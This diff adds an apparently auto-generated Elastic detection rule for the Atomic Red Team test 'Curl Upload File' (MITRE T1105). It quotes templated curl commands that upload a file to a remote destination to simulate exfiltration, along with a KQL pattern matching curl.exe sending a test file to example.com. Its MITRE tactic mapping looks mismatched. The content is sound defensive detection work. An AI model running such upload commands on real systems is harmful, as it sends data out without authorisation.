@@ -1,0 +1,39 @@
+[rule]
+author = [ "AtomicRedTeam-Automation",]
+description = "Detection for specific test 'Curl Upload File' (GUID: 635c9a38-6cbf-47dc-8615-3810bc1167cf) of technique T1105 (Ingress Tool Transfer). Test Description: The following Atomic utilizes native curl.exe, or downloads it if not installed, to upload a txt file to simulate data exfiltration\nExpected output will include whether the file uploaded successfully or not.. Command/Steps: #{curl_path} -T #{file_path} #{remote_destination}\n#{curl_path} --upload-file #{file_path} #{remote_destination}\n#{curl_path} -d #{file_path} #{remote..."
+from = "now-9m"
+rule_id = "19cf83e7-d0bf-4858-a976-c082d40beb1e"
+language = "kql"
+name = "Atomic Test: T1105 - Curl Upload File"
+output_index = ".siem-signals-default"
+references = [ "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/refs/heads/master/atomics/T1105/T1105.yaml",]
+risk_score = 50
+severity = "medium"
+tags = [ "AtomicRedTeam", "T1105", "635c9a38-6cbf-47dc-8615-3810bc1167cf", "windows",]
+type = "query"
+query = "(process.name : (\\\"cmd.exe\\\", \\\"cmmon32.exe\\\") OR process.parent.name : (\\\"cmd.exe\\\", \\\"cmmon32.exe\\\")) AND process.command_line : \\\"*C:\\\\Windows\\\\System32\\\\Curl.exe*\\\" AND process.command_line : \\\"*c:\\\\temp\\\\atomictestfile.txt*\\\" AND process.command_line : \\\"*www.example.com*\\\""
+version = 1
+index = [ "logs-endpoint.events.*", "winlogbeat-*", "logs-windows.*", "logs-linux.*", "logs-macos.*",]
+[[rule.threat]]
+framework = "MITRE ATT&CK"
+[[rule.threat.technique]]
+id = "T1105"
+name = "Curl Upload File"
+reference = "https://attack.mitre.org/techniques/T1105"
+
+[[rule.threat.tactic]]
+id = "TA0003"
+name = "Persistence"
+reference = "https://attack.mitre.org/techniques/T1105"
+
+[[rule.threat.tactic]]
+id = "TA0004"
+name = "Privilege Escalation"
+reference = "https://attack.mitre.org/techniques/T1105"
+
+[[rule.threat.tactic]]
+id = "TA0005"
+name = "Defense Evasion"
+reference = "https://attack.mitre.org/techniques/T1105"
+
+
